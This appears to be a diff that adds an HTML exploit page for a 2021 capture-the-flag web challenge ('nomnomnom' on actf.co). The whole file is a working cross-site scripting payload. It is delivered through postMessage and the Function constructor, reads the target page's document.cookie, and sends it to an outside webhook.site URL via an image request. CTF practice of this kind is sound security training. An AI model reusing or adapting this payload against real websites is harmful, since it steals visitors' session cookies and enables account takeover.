@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+</head>
+<body>
+    <iframe name="f" onload="run()" src="https://nomnomnom.2021.chall.actf.co"></iframe>
+    <script>
+      function run() {
+        window.frames.f.postMessage(
+          `([].map.constructor('
+              var w1=window.open("https://nomnomnom.2021.chall.actf.co");
+              setTimeout(()=>{
+                var c=document.createElement("img");
+                c.src="https://webhook.site/d26304f0-a2a4-465d-8a20-06a95632e112?c="+w1.document.cookie;
+                document.body.appendChild(c)
+              }, 2000)
+            '))()`
+          , '*'
+        )
+      }
+    </script>
+</body>
+
+</html>
